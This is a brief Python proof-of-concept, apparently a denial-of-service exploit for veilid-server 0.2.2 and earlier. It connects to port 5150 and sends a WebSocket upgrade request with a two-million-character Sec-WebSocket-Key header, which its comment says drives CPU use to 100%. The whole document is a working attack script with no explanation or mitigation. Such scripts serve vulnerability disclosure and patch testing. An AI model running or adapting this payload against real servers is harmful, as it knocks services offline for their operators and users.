# When pointed at veilid-server 0.2.2 or earlier, this will cause 100% CPU utilization

import socket
s = socket.socket()
s.connect(('127.0.0.1',5150))
s.send(f"GET /ws HTTP/1.1\r\nSec-WebSocket-Version: 13\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Key: {'A'*2000000}\r\n\r\n".encode())
s.close()
